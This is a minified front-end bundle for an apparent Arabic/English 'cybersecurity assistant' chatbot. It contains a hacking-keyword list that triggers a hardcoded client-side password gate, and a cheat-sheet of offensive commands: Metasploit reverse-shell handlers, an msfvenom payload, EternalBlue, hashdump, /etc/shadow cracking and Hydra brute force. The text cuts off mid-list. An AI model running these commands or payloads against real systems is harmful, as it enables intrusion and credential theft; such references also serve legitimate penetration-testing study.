        "spoof",
        "انتحال",
        "keylogger",
        "trojan",
        "rat",
        "botnet",
        "reverse",
        "meterpreter",
        "metasploit",
        "nmap",
        "kali",
        "penetration",
        "pentest",
        "vulnerability",
        "استغلال",
        "تجسس",
        "spy",
        "sniff",
        "intercept",
        "mitm",
        "man in the middle",
        "zero day",
        "0day",
        "buffer overflow",
        "privilege escalation",
        "تصعيد صلاحيات",
        "lateral movement",
        "persistence",
        "c2",
        "command and control",
        "exfiltration",
        "تسريب",
        "dump",
        "hash",
        "rainbow table",
        "wordlist",
        "dictionary attack",
        "social engineering",
        "reconnaissance",
        "footprinting",
        "enumeration",
        "scanning",
        "exploitation",
    ],
    Xb = () => {
        var B;
        const [e, t] = x.useState([]),
            [n, r] = x.useState(""),
            [o, s] = x.useState(!1),
            [i, a] = x.useState(!1),
            [l, u] = x.useState(""),
            [d, p] = x.useState(!1),
            [m, f] = x.useState(""),
            [S, v] = x.useState(""),
            [w, g] = x.useState("ar"),
            [h, y] = x.useState(null),
            b = x.useRef(null),
            k = x.useRef(null),
            C = "Qusay_kali",
            E = () => {
                var I;
                (I = b.current) == null || I.scrollIntoView({ behavior: "smooth" });
            };
        x.useEffect(() => {
            E();
        }, [e]);
        const j = (I) => {
                const N = I.toLowerCase();
                return qb.some((T) => N.includes(T.toLowerCase()));
            },
            _ = (I) => {
                var T;
                const N = (T = I.target.files) == null ? void 0 : T[0];
                if (N) {
                    const L = new FileReader();
                    (L.onloadend = () => {
                        y(L.result);
                    }),
                        L.readAsDataURL(N);
                }
            },
            M = () => {
                y(null), k.current && (k.current.value = "");
            },
            H = async (I) => {
                if ((I.preventDefault(), (!n.trim() && !h) || o)) return;
                const N = n.trim();
                if (j(N) && !d) {
                    f(N), a(!0), r("");
                    return;
                }
                D(N, h), y(null), k.current && (k.current.value = "");
            },
            D = async (I, N) => {
                var V, U, q, X;
                r("");
                const T = { role: "user", content: I };
                N && (T.image = N);
                const L = [...e, T];
                t(L), s(!0);
                try {
                    const ne = L.map((ge) =>
                            ge.image
                                ? {
                                      role: ge.role,
                                      content: [
                                          {
                                              type: "text",
                                              text:
                                                  ge.content || (w === "ar" ? "ما هذه الصورة؟" : "What is this image?"),
                                          },
                                          { type: "image_url", image_url: { url: ge.image } },
                                      ],
                                  }
                                : { role: ge.role, content: ge.content }
                        ),
                        fe = await fetch("https://breyobjsazysyeozhrkq.supabase.co/functions/v1/ai-chat", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                                Authorization:
                                    "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJyZXlvYmpzYXp5c3llb3pocmtxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY4MTU3MzQsImV4cCI6MjA4MjM5MTczNH0.A-UpHE-LZ0BGp09vMWwUEG7v1u3Rl99o9XANIxUxhu4",
                            },
                            body: JSON.stringify({ messages: ne, language: w }),
                        });
                    if (!fe.ok) {
                        const ge = await fe.json();
                        throw new Error(ge.error || "Failed to get response");
                    }
                    const Z = (V = fe.body) == null ? void 0 : V.getReader();
                    if (!Z) throw new Error("No response body");
                    const an = new TextDecoder();
                    let ct = "",
                        ut = "";
                    for (t((ge) => [...ge, { role: "assistant", content: "" }]); ; ) {
                        const { done: ge, value: ln } = await Z.read();
                        if (ge) break;
                        ut += an.decode(ln, { stream: !0 });
                        const dt = ut.split(`
`);
                        ut = dt.pop() || "";
                        for (const Ht of dt) {
                            if (Ht.startsWith(":") || Ht.trim() === "" || !Ht.startsWith("data: ")) continue;
                            const br = Ht.slice(6).trim();
                            if (br !== "[DONE]")
                                try {
                                    const kr =
                                        (X =
                                            (q = (U = JSON.parse(br).choices) == null ? void 0 : U[0]) == null
                                                ? void 0
                                                : q.delta) == null
                                            ? void 0
                                            : X.content;
                                    kr &&
                                        ((ct += kr),
                                        t((Kn) => {
                                            const jt = [...Kn];
                                            return (jt[jt.length - 1] = { role: "assistant", content: ct }), jt;
                                        }));
                                } catch {}
                        }
                    }
                } catch (ne) {
                    console.error("Error:", ne),
                        t((fe) => [
                            ...fe,
                            {
                                role: "assistant",
                                content:
                                    w === "ar"
                                        ? `❌ حدث خطأ: ${ne instanceof Error ? ne.message : "خطأ غير معروف"}. حاول مرة أخرى.`
                                        : `❌ Error: ${ne instanceof Error ? ne.message : "Unknown error"}. Please try again.`,
                            },
                        ]);
                } finally {
                    s(!1);
                }
            },
            G = (I) => {
                I.preventDefault(),
                    l === C || l.toLowerCase() === C.toLowerCase()
                        ? (p(!0), a(!1), v(""), m && (D(m), f("")))
                        : v(
                              w === "ar"
                                  ? "كلمة السر غير صحيحة. تواصل مع المطور على انستغرام للحصول عليها."
                                  : "Incorrect password. Contact the developer on Instagram to get it."
                          ),
                    u("");
            },
            O = () => {
                g((I) => (I === "ar" ? "en" : "ar"));
            },
            $ = {
                title: "Qusay AI",
                subtitle: w === "ar" ? "مساعدك الذكي في الأمن السيبراني" : "Your smart cybersecurity assistant",
                developer: w === "ar" ? "تطوير: Qusay_kali" : "Developed by: Qusay_kali",
                advancedMode: w === "ar" ? "وضع متقدم مفعّل" : "Advanced mode enabled",
                welcome: w === "ar" ? " اهلا بك يا هكر!" : "Welcome, hacker!",
                askAnything: w === "ar" ? "اسألني أي سؤال عن الأمن السيبراني" : "Ask me anything about cybersecurity",
                advancedTip:
                    w === "ar"
                        ? " "
                        : "      ",
                typePlaceholder: w === "ar" ? "اكتب سؤالك هنا..." : "Type your question here...",
                advancedRequest: w === "ar" ? "طلب متقدم" : "Advanced Request",
                advancedDesc:
                    w === "ar"
                        ? "هذا السؤال يتطلب صلاحيات متقدمة. أدخل كلمة السر للمتابعة."
                        : "This question requires advanced permissions. Enter the password to continue.",
                passwordHint:
                    w === "ar"
                        ? "للحصول على كلمة السر، تواصل مع المطور على انستغرام"
                        : "To get the password, contact the developer on Instagram",
                enterPassword: w === "ar" ? "أدخل كلمة السر..." : "Enter password...",
                cancel: w === "ar" ? "إلغاء" : "Cancel",
                confirm: w === "ar" ? "تأكيد" : "Confirm",
                contactInstagram: w === "ar" ? "تواصل على انستغرام" : "Contact on Instagram",
                addImage: w === "ar" ? "أضف صورة" : "Add image",
            };
        return c.jsxs("div", {
            className: "min-h-screen bg-background flex flex-col",
            children: [
                c.jsx(wr, {}),
                c.jsx("main", {
                    className: "flex-1 pt-24 pb-8 flex flex-col",
                    children: c.jsxs("div", {
                        className: "container mx-auto px-4 flex-1 flex flex-col max-w-4xl",
                        children: [
                            c.jsxs("div", {
                                className: "text-center mb-8",
                                children: [
                                    c.jsx("div", {
                                        className: "flex justify-center mb-4",
                                        children: c.jsx("div", {
                                            className: "cyber-icon-box w-16 h-16",
                                            children: c.jsx(ng, { className: "w-8 h-8 text-primary" }),
                                        }),
                                    }),
                                    c.jsx("h1", {
                                        className: "text-3xl md:text-4xl font-bold text-primary text-glow mb-2",
                                        children: $.title,
                                    }),
                                    c.jsx("p", { className: "text-muted-foreground", children: $.subtitle }),
                                    c.jsx("p", { className: "text-xs text-primary/70 mt-1", children: $.developer }),
                                    c.jsxs("div", {
                                        className: "flex items-center justify-center gap-3 mt-4",
                                        children: [
                                            d &&
                                                c.jsxs("span", {
                                                    className:
                                                        "inline-flex items-center gap-2 px-3 py-1 rounded-full bg-primary/20 text-primary text-sm",
                                                    children: [c.jsx(vc, { className: "w-4 h-4" }), $.advancedMode],
                                                }),
                                            c.jsxs("button", {
                                                onClick: O,
                                                className:
                                                    "inline-flex items-center gap-2 px-3 py-1 rounded-full bg-secondary border border-border/50 text-muted-foreground text-sm hover:border-primary/50 transition-colors",
                                                children: [
                                                    c.jsx(Rs, { className: "w-4 h-4" }),
                                                    w === "ar" ? "English" : "العربية",
                                                ],
                                            }),
                                        ],
                                    }),
                                ],
                            }),
                            c.jsxs("div", {
                                className: "flex-1 cyber-card overflow-hidden flex flex-col",
                                children: [
                                    c.jsxs("div", {
                                        className: "flex-1 overflow-y-auto p-4 space-y-4",
                                        children: [
                                            e.length === 0
                                                ? c.jsxs("div", {
                                                      className: "text-center py-12 text-muted-foreground",
                                                      children: [
                                                          c.jsx(ll, { className: "w-16 h-16 mx-auto mb-4 opacity-50" }),
                                                          c.jsx("p", {
                                                              className: "text-lg mb-2",
                                                              children: $.welcome,
                                                          }),
                                                          c.jsx("p", { className: "text-sm", children: $.askAnything }),
                                                          c.jsxs("div", {
                                                              className: "mt-6 flex flex-col items-center gap-3",
                                                              children: [
                                                                  c.jsxs("p", {
                                                                      className:
                                                                          "text-xs text-muted-foreground/70 max-w-md",
                                                                      children: [" ", $.advancedTip],
                                                                  }),
                                                                  c.jsxs("a", {
                                                                      href: "https://www.instagram.com/qusay_kali1/",
                                                                      target: "_blank",
                                                                      rel: "noopener noreferrer",
                                                                      className:
                                                                          "inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-gradient-to-r from-purple-500 to-pink-500 text-white text-sm font-medium hover:opacity-90 transition-opacity",
                                                                      children: [
                                                                          c.jsx(xp, { className: "w-4 h-4" }),
                                                                          $.contactInstagram,
                                                                      ],
                                                                  }),
                                                              ],
                                                          }),
                                                      ],
                                                  })
                                                : e.map((I, N) =>
                                                      c.jsxs(
                                                          "div",
                                                          {
                                                              className: `flex items-start gap-3 ${I.role === "user" ? "flex-row-reverse" : ""}`,
                                                              children: [
                                                                  c.jsx("div", {
                                                                      className: `w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0 ${I.role === "user" ? "bg-primary/20 border border-primary/30" : "bg-secondary border border-border/50"}`,
                                                                      children:
                                                                          I.role === "user"
                                                                              ? c.jsx(wc, {
                                                                                    className: "w-5 h-5 text-primary",
                                                                                })
                                                                              : c.jsx(ll, {
                                                                                    className:
                                                                                        "w-5 h-5 text-muted-foreground",
                                                                                }),
                                                                  }),
                                                                  c.jsxs("div", {
                                                                      className: `max-w-[80%] rounded-2xl p-4 ${I.role === "user" ? "bg-primary/20 border border-primary/30" : "bg-secondary border border-border/50"}`,
                                                                      children: [
                                                                          I.image &&
                                                                              c.jsx("img", {
                                                                                  src: I.image,
                                                                                  alt: "Uploaded",
                                                                                  className:
                                                                                      "max-w-full h-auto rounded-lg mb-3 max-h-64 object-contain",
                                                                              }),
                                                                          I.content &&
                                                                              c.jsx("p", {
                                                                                  className:
                                                                                      "text-foreground whitespace-pre-wrap leading-relaxed",
                                                                                  children: I.content,
                                                                              }),
                                                                      ],
                                                                  }),
                                                              ],
                                                          },
                                                          N
                                                      )
                                                  ),
                                            o &&
                                                ((B = e[e.length - 1]) == null ? void 0 : B.role) === "user" &&
                                                c.jsxs("div", {
                                                    className: "flex items-start gap-3",
                                                    children: [
                                                        c.jsx("div", {
                                                            className:
                                                                "w-10 h-10 rounded-xl bg-secondary border border-border/50 flex items-center justify-center",
                                                            children: c.jsx(ll, {
                                                                className: "w-5 h-5 text-muted-foreground",
                                                            }),
                                                        }),
                                                        c.jsx("div", {
                                                            className:
                                                                "bg-secondary border border-border/50 rounded-2xl p-4",
                                                            children: c.jsxs("div", {
                                                                className: "flex gap-1",
                                                                children: [
                                                                    c.jsx("span", {
                                                                        className:
                                                                            "w-2 h-2 bg-primary rounded-full animate-bounce",
                                                                        style: { animationDelay: "0ms" },
                                                                    }),
                                                                    c.jsx("span", {
                                                                        className:
                                                                            "w-2 h-2 bg-primary rounded-full animate-bounce",
                                                                        style: { animationDelay: "150ms" },
                                                                    }),
                                                                    c.jsx("span", {
                                                                        className:
                                                                            "w-2 h-2 bg-primary rounded-full animate-bounce",
                                                                        style: { animationDelay: "300ms" },
                                                                    }),
                                                                ],
                                                            }),
                                                        }),
                                                    ],
                                                }),
                                            c.jsx("div", { ref: b }),
                                        ],
                                    }),
                                    c.jsxs("form", {
                                        onSubmit: H,
                                        className: "p-4 border-t border-border/30",
                                        children: [
                                            h &&
                                                c.jsxs("div", {
                                                    className: "mb-3 relative inline-block",
                                                    children: [
                                                        c.jsx("img", {
                                                            src: h,
                                                            alt: "Preview",
                                                            className: "max-h-32 rounded-lg border border-border/50",
                                                        }),
                                                        c.jsx("button", {
                                                            type: "button",
                                                            onClick: M,
                                                            className:
                                                                "absolute -top-2 -right-2 w-6 h-6 rounded-full bg-destructive text-destructive-foreground flex items-center justify-center hover:opacity-80",
                                                            children: c.jsx(_u, { className: "w-4 h-4" }),
                                                        }),
                                                    ],
                                                }),
                                            c.jsxs("div", {
                                                className: "flex gap-3",
                                                children: [
                                                    c.jsx("input", {
                                                        type: "file",
                                                        ref: k,
                                                        onChange: _,
                                                        accept: "image/*",
                                                        className: "hidden",
                                                    }),
                                                    c.jsx("button", {
                                                        type: "button",
                                                        onClick: () => {
                                                            var I;
                                                            return (I = k.current) == null ? void 0 : I.click();
                                                        },
                                                        className:
                                                            "px-4 py-3 rounded-xl bg-secondary border border-border/50 text-muted-foreground hover:border-primary/50 hover:text-primary transition-all",
                                                        title: $.addImage,
                                                        children: c.jsx(rx, { className: "w-5 h-5" }),
                                                    }),
                                                    c.jsx("input", {
                                                        type: "text",
                                                        value: n,
                                                        onChange: (I) => r(I.target.value),
                                                        placeholder: $.typePlaceholder,
                                                        className:
                                                            "flex-1 px-4 py-3 rounded-xl bg-secondary border border-border/50 text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 focus:ring-2 focus:ring-primary/20 transition-all",
                                                        disabled: o,
                                                        dir: w === "ar" ? "rtl" : "ltr",
                                                    }),
                                                    c.jsx("button", {
                                                        type: "submit",
                                                        disabled: o || (!n.trim() && !h),
                                                        className:
                                                            "cyber-button-primary px-6 disabled:opacity-50 disabled:cursor-not-allowed",
                                                        children: c.jsx(ux, { className: "w-5 h-5" }),
                                                    }),
                                                ],
                                            }),
                                        ],
                                    }),
                                ],
                            }),
                        ],
                    }),
                }),
                c.jsx(Sr, {}),
                i &&
                    c.jsx("div", {
                        className:
                            "fixed inset-0 z-50 flex items-center justify-center bg-background/80 backdrop-blur-sm",
                        children: c.jsxs("div", {
                            className: "cyber-card p-8 max-w-md w-full mx-4 animate-scale-in",
                            children: [
                                c.jsxs("div", {
                                    className: "text-center mb-6",
                                    children: [
                                        c.jsx("div", {
                                            className:
                                                "w-16 h-16 rounded-2xl bg-primary/10 border border-primary/30 flex items-center justify-center mx-auto mb-4",
                                            children: c.jsx(vc, { className: "w-8 h-8 text-primary" }),
                                        }),
                                        c.jsx("h2", {
                                            className: "text-2xl font-bold text-primary mb-2",
                                            children: $.advancedRequest,
                                        }),
                                        c.jsx("p", {
                                            className: "text-muted-foreground text-sm",
                                            children: $.advancedDesc,
                                        }),
                                    ],
                                }),
                                c.jsxs("div", {
                                    className:
                                        "flex flex-col items-center gap-4 p-4 rounded-xl bg-gradient-to-r from-purple-500/10 to-pink-500/10 border border-purple-500/30 mb-6",
                                    children: [
                                        c.jsx("p", {
                                            className: "text-sm text-muted-foreground text-center",
                                            children: $.passwordHint,
                                        }),
                                        c.jsxs("a", {
                                            href: "https://www.instagram.com/qusay_kali1/",
                                            target: "_blank",
                                            rel: "noopener noreferrer",
                                            className:
                                                "inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-gradient-to-r from-purple-500 to-pink-500 text-white text-sm font-medium hover:opacity-90 transition-opacity",
                                            children: [c.jsx(xp, { className: "w-4 h-4" }), "@qusay_kali"],
                                        }),
                                    ],
                                }),
                                c.jsxs("form", {
                                    onSubmit: G,
                                    children: [
                                        c.jsx("input", {
                                            type: "password",
                                            value: l,
                                            onChange: (I) => u(I.target.value),
                                            placeholder: $.enterPassword,
                                            className:
                                                "w-full px-4 py-3 rounded-xl bg-secondary border border-border/50 text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 focus:ring-2 focus:ring-primary/20 transition-all mb-4",
                                            autoFocus: !0,
                                        }),
                                        S &&
                                            c.jsx("p", {
                                                className: "text-destructive text-sm mb-4 text-center",
                                                children: S,
                                            }),
                                        c.jsxs("div", {
                                            className: "flex gap-3",
                                            children: [
                                                c.jsx("button", {
                                                    type: "button",
                                                    onClick: () => {
                                                        a(!1), f(""), v("");
                                                    },
                                                    className:
                                                        "flex-1 px-6 py-3 rounded-xl border border-border/50 text-muted-foreground hover:bg-secondary transition-colors",
                                                    children: $.cancel,
                                                }),
                                                c.jsx("button", {
                                                    type: "submit",
                                                    className: "flex-1 cyber-button-primary",
                                                    children: $.confirm,
                                                }),
                                            ],
                                        }),
                                    ],
                                }),
                            ],
                        }),
                    }),
            ],
        });
    },
    Yb = {
        Nmap: $r,
        Metasploit: fo,
        "Burp Suite": Jv,
        Wireshark: lx,
        "John the Ripper": yc,
        Hydra: ag,
        SQLMap: og,
        "Aircrack-ng": gx,
        Nikto: rg,
        Hashcat: tx,
        Gobuster: Gr,
        Netcat: dx,
        Enum4linux: ox,
        Dirb: Gi,
        Wfuzz: Mu,
        theHarvester: cx,
        Maltego: ex,
        Responder: hx,
    },
    Io = [
        {
            name: "Nmap",
            description: {
                ar: "أداة فحص الشبكات واكتشاف المنافذ المفتوحة",
                en: "Network scanning and port discovery tool",
            },
            commands: [
                {
                    command: "nmap -sP 192.168.1.0/24",
                    description: {
                        ar: "فحص جميع الأجهزة في الشبكة (Ping Scan)",
                        en: "Scan all devices in network (Ping Scan)",
                    },
                },
                {
                    command: "nmap -sS 192.168.1.1",
                    description: { ar: "فحص سريع للمنافذ (SYN Scan)", en: "Fast port scan (SYN Scan)" },
                },
                {
                    command: "nmap -sV 192.168.1.1",
                    description: { ar: "اكتشاف إصدارات الخدمات", en: "Service version detection" },
                },
                { command: "nmap -O 192.168.1.1", description: { ar: "اكتشاف نظام التشغيل", en: "OS detection" } },
                { command: "nmap -A 192.168.1.1", description: { ar: "فحص شامل", en: "Aggressive scan" } },
                {
                    command: "nmap -p 1-65535 192.168.1.1",
                    description: { ar: "فحص جميع المنافذ", en: "Full port scan" },
                },
                { command: "nmap -sU 192.168.1.1", description: { ar: "فحص منافذ UDP", en: "UDP port scan" } },
                {
                    command: "nmap --script vuln 192.168.1.1",
                    description: { ar: "فحص الثغرات", en: "Vulnerability scan" },
                },
                {
                    command: "nmap -sN 192.168.1.1",
                    description: { ar: "فحص خفي (Null Scan)", en: "Stealth scan (Null Scan)" },
                },
                {
                    command: "nmap -oN scan.txt 192.168.1.1",
                    description: { ar: "حفظ النتائج في ملف", en: "Save results to file" },
                },
                {
                    command: "nmap -sC 192.168.1.1",
                    description: { ar: "تشغيل السكربتات الافتراضية", en: "Run default scripts" },
                },
                {
                    command: "nmap -Pn 192.168.1.1",
                    description: { ar: "تخطي Ping واعتبار الهدف متصل", en: "Skip ping, treat host as online" },
                },
                {
                    command: "nmap -T4 192.168.1.1",
                    description: { ar: "فحص سريع (Aggressive Timing)", en: "Fast scan (Aggressive Timing)" },
                },
                {
                    command: "nmap --script http-enum 192.168.1.1",
                    description: { ar: "اكتشاف مجلدات الويب", en: "Web directory enumeration" },
                },
                {
                    command: "nmap -sS -sV -O -A 192.168.1.1",
                    description: { ar: "فحص شامل مع كل الميزات", en: "Full scan with all features" },
                },
                {
                    command: "nmap --script smb-vuln* 192.168.1.1",
                    description: { ar: "فحص ثغرات SMB", en: "SMB vulnerability scan" },
                },
                {
                    command: "nmap -sV --version-intensity 5 192.168.1.1",
                    description: { ar: "فحص عميق للإصدارات", en: "Deep version scan" },
                },
                {
                    command: "nmap --top-ports 1000 192.168.1.1",
                    description: { ar: "فحص أشهر 1000 منفذ", en: "Scan top 1000 ports" },
                },
                {
                    command: "nmap -f 192.168.1.1",
                    description: {
                        ar: "تقسيم الحزم لتجاوز الجدار الناري",
                        en: "Fragment packets for firewall evasion",
                    },
                },
                {
                    command: "nmap --spoof-mac 0 192.168.1.1",
                    description: { ar: "استخدام MAC عشوائي", en: "Use random MAC address" },
                },
            ],
        },
        {
            name: "Metasploit",
            description: { ar: "إطار عمل لاختبار الاختراق وتنفيذ الثغرات", en: "Penetration testing framework" },
            commands: [
                {
                    command: "msfconsole",
                    description: { ar: "تشغيل واجهة Metasploit", en: "Start Metasploit console" },
                },
                {
                    command: "search exploit/windows",
                    description: { ar: "البحث عن ثغرات ويندوز", en: "Search Windows exploits" },
                },
                {
                    command: "use exploit/multi/handler",
                    description: { ar: "استخدام مستقبل الاتصالات", en: "Use connection handler" },
                },
                {
                    command: "set PAYLOAD windows/meterpreter/reverse_tcp",
                    description: { ar: "تعيين Payload", en: "Set payload" },
                },
                { command: "set LHOST 192.168.1.100", description: { ar: "تعيين IP المهاجم", en: "Set attacker IP" } },
                { command: "set LPORT 4444", description: { ar: "تعيين المنفذ", en: "Set port" } },
                { command: "exploit", description: { ar: "تنفيذ الاستغلال", en: "Execute exploit" } },
                { command: "sessions -l", description: { ar: "عرض الجلسات النشطة", en: "List active sessions" } },
                { command: "sessions -i 1", description: { ar: "الدخول للجلسة", en: "Interact with session" } },
                {
                    command: "db_nmap -sV 192.168.1.1",
                    description: { ar: "فحص Nmap وحفظ في قاعدة البيانات", en: "Nmap scan and save to DB" },
                },
                {
                    command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe",
                    description: { ar: "إنشاء Payload", en: "Generate payload" },
                },
                {
                    command: "use auxiliary/scanner/portscan/tcp",
                    description: { ar: "فحص المنافذ", en: "Port scanner" },
                },
                {
                    command: "use post/windows/gather/hashdump",
                    description: { ar: "استخراج الهاشات", en: "Dump hashes" },
                },
                { command: "background", description: { ar: "إرسال الجلسة للخلفية", en: "Background session" } },
                {
                    command: "use exploit/windows/smb/ms17_010_eternalblue",
                    description: { ar: "ثغرة EternalBlue", en: "EternalBlue exploit" },
                },
                {
                    command: "search type:exploit platform:linux",
                    description: { ar: "البحث عن ثغرات لينكس", en: "Search Linux exploits" },
                },
                { command: "show options", description: { ar: "عرض الخيارات المتاحة", en: "Show options" } },
                {
                    command: "info exploit/windows/smb/ms08_067",
                    description: { ar: "معلومات عن ثغرة", en: "Exploit info" },
                },
                {
                    command: "vulns",
                    description: { ar: "عرض الثغرات المكتشفة", en: "Show discovered vulnerabilities" },
                },
                {
                    command: "workspace -a pentest",
                    description: { ar: "إنشاء مساحة عمل جديدة", en: "Create new workspace" },
                },
            ],
        },
        {
            name: "Burp Suite",
            description: { ar: "أداة لفحص تطبيقات الويب واكتشاف الثغرات", en: "Web application security testing tool" },
            commands: [
                {
                    command: "Proxy → Intercept → On",
                    description: { ar: "تفعيل اعتراض الطلبات", en: "Enable request interception" },
                },
                { command: "Target → Site map", description: { ar: "عرض خريطة الموقع", en: "View site map" } },
                {
                    command: "Intruder → Positions",
                    description: { ar: "تحديد نقاط الحقن", en: "Set injection points" },
                },
                { command: "Repeater → Send", description: { ar: "إعادة إرسال الطلبات", en: "Resend requests" } },
                {
                    command: "Scanner → Active scan",
                    description: { ar: "فحص تلقائي للثغرات", en: "Active vulnerability scan" },
                },
                { command: "Decoder → Encode/Decode", description: { ar: "تشفير وفك تشفير", en: "Encode/Decode" } },
                { command: "Comparer → Compare", description: { ar: "مقارنة استجابتين", en: "Compare responses" } },
                { command: "Extender → BApp Store", description: { ar: "تثبيت إضافات", en: "Install extensions" } },
                { command: "Options → Upstream Proxy", description: { ar: "إعداد بروكسي", en: "Configure proxy" } },
                { command: "Logger → View logs", description: { ar: "عرض السجلات", en: "View logs" } },
                { command: "Intruder → Sniper Attack", description: { ar: "هجوم Sniper", en: "Sniper attack" } },
                {
                    command: "Intruder → Cluster Bomb",
                    description: { ar: "هجوم Cluster Bomb", en: "Cluster Bomb attack" },
                },
                {
                    command: "Collaborator → Poll now",
                    description: { ar: "فحص Collaborator", en: "Poll Collaborator" },
                },
                { command: "Target → Scope → Add", description: { ar: "إضافة للنطاق", en: "Add to scope" } },
                {
                    command: "Proxy → Options → Match and Replace",
                    description: { ar: "تعديل الطلبات تلقائياً", en: "Auto-modify requests" },
                },
                { command: "Sequencer → Live capture", description: { ar: "تحليل التوكنات", en: "Token analysis" } },
                { command: "Scanner → Crawl", description: { ar: "زحف الموقع", en: "Crawl site" } },
                { command: "Proxy → HTTP history", description: { ar: "سجل الطلبات", en: "Request history" } },
                { command: "Target → Issues", description: { ar: "عرض المشاكل المكتشفة", en: "View issues" } },
                { command: "Dashboard → Event log", description: { ar: "سجل الأحداث", en: "Event log" } },
            ],
        },
        {
            name: "Wireshark",
            description: { ar: "أداة تحليل حزم الشبكة", en: "Network packet analyzer" },
            commands: [
                { command: "ip.addr == 192.168.1.1", description: { ar: "فلترة حسب IP", en: "Filter by IP" } },
                { command: "tcp.port == 80", description: { ar: "فلترة حسب منفذ TCP", en: "Filter by TCP port" } },
                { command: "http", description: { ar: "عرض HTTP فقط", en: "Show HTTP only" } },
                { command: "dns", description: { ar: "عرض DNS فقط", en: "Show DNS only" } },
                { command: "tcp.flags.syn == 1", description: { ar: "عرض حزم SYN", en: "Show SYN packets" } },
                { command: 'frame contains "password"', description: { ar: "البحث عن كلمة", en: "Search for word" } },
                { command: "ip.src == 192.168.1.1", description: { ar: "فلترة حسب المصدر", en: "Filter by source" } },
                {
                    command: "ip.dst == 192.168.1.1",
                    description: { ar: "فلترة حسب الوجهة", en: "Filter by destination" },
                },
                { command: "Follow TCP Stream", description: { ar: "تتبع محادثة TCP", en: "Follow TCP stream" } },
                {
                    command: "Statistics → Protocol Hierarchy",
                    description: { ar: "إحصائيات البروتوكولات", en: "Protocol statistics" },
                },
                {
                    command: 'http.request.method == "POST"',
                    description: { ar: "طلبات POST فقط", en: "POST requests only" },
                },
                {
                    command: "tcp.analysis.retransmission",
                    description: { ar: "الحزم المعاد إرسالها", en: "Retransmitted packets" },
                },
                { command: "!arp", description: { ar: "استبعاد ARP", en: "Exclude ARP" } },
                { command: "ssl.handshake", description: { ar: "عرض SSL Handshake", en: "Show SSL Handshake" } },
                { command: "ftp", description: { ar: "عرض FTP فقط", en: "Show FTP only" } },
                { command: "icmp", description: { ar: "عرض ICMP فقط", en: "Show ICMP only" } },
                { command: "tcp.stream eq 0", description: { ar: "عرض Stream محدد", en: "Show specific stream" } },
                { command: "http.response.code == 404", description: { ar: "أخطاء 404", en: "404 errors" } },
                { command: "eth.addr == aa:bb:cc:dd:ee:ff", description: { ar: "فلترة حسب MAC", en: "Filter by MAC" } },
                {
                    command: "Statistics → Conversations",
                    description: { ar: "المحادثات الشبكية", en: "Network conversations" },
                },
            ],
        },
        {
            name: "John the Ripper",
            description: { ar: "أداة لكسر كلمات المرور", en: "Password cracking tool" },
            commands: [
                {
                    command: "john --wordlist=rockyou.txt hash.txt",
                    description: { ar: "كسر باستخدام قائمة", en: "Crack with wordlist" },
                },
                { command: "john --format=raw-md5 hash.txt", description: { ar: "كسر MD5", en: "Crack MD5" } },
                { command: "john --show hash.txt", description: { ar: "عرض المكسورة", en: "Show cracked" } },
                {
                    command: "john --incremental hash.txt",
                    description: { ar: "هجوم تزايدي", en: "Incremental attack" },
                },
                { command: "john --rules hash.txt", description: { ar: "استخدام قواعد", en: "Use rules" } },
                {
                    command: "unshadow /etc/passwd /etc/shadow > hash.txt",
                    description: { ar: "دمج ملفات لينكس", en: "Merge Linux files" },
                },
                { command: "john --format=NT hash.txt", description: { ar: "كسر NTLM", en: "Crack NTLM" } },
                { command: "john --fork=4 hash.txt", description: { ar: "استخدام 4 أنوية", en: "Use 4 cores" } },
                { command: "john --restore", description: { ar: "استكمال جلسة", en: "Resume session" } },
                {
                    command: "john --list=formats",
                    description: { ar: "عرض الصيغ المدعومة", en: "List supported formats" },
                },
                {
                    command: "john --pot=cracked.pot hash.txt",
                    description: { ar: "حفظ في ملف مخصص", en: "Save to custom file" },
                },
                { command: "john --mask=?a?a?a?a hash.txt", description: { ar: "هجوم Mask", en: "Mask attack" } },
                { command: "john --single hash.txt", description: { ar: "وضع Single Crack", en: "Single crack mode" } },
                {
                    command: "john --loopback hash.txt",
                    description: { ar: "إعادة استخدام المكسورة", en: "Reuse cracked passwords" },
                },
                {
                    command: "john --format=sha512crypt hash.txt",
                    description: { ar: "كسر SHA512", en: "Crack SHA512" },
                },
                {
                    command: "zip2john file.zip > hash.txt",
                    description: { ar: "استخراج هاش ZIP", en: "Extract ZIP hash" },
                },
                {
                    command: "pdf2john file.pdf > hash.txt",
                    description: { ar: "استخراج هاش PDF", en: "Extract PDF hash" },
                },
                {
                    command: "john --session=crack1 hash.txt",
                    description: { ar: "حفظ الجلسة باسم", en: "Save session with name" },
                },
                { command: "john --status", description: { ar: "حالة الكسر", en: "Crack status" } },
                {
                    command: "john --wordlist=wordlist.txt --rules=best64 hash.txt",
                    description: { ar: "قائمة مع قواعد", en: "Wordlist with rules" },
                },
            ],
        },
        {
            name: "Hydra",
            description: { ar: "أداة لهجمات القوة الغاشمة", en: "Brute force attack tool" },
            commands: [
                {
                    command: "hydra -l admin -P pass.txt 192.168.1.1 ssh",
                    description: { ar: "هجوم SSH", en: "SSH attack" },
                },
                {
                    command: "hydra -L users.txt -P pass.txt 192.168.1.1 ftp",
                    description: { ar: "هجوم FTP", en: "FTP attack" },
                },
                {
                    command:
                        'hydra -l admin -P pass.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"',
                    description: { ar: "هجوم نموذج ويب", en: "Web form attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt rdp://192.168.1.1",
                    description: { ar: "هجوم RDP", en: "RDP attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt mysql://192.168.1.1",
                    description: { ar: "هجوم MySQL", en: "MySQL attack" },
                },
                {
                    command: "hydra -t 4 -l admin -P pass.txt ssh://192.168.1.1",
                    description: { ar: "4 محاولات متزامنة", en: "4 concurrent attempts" },
                },
                {
                    command: "hydra -V -l admin -P pass.txt 192.168.1.1 ssh",
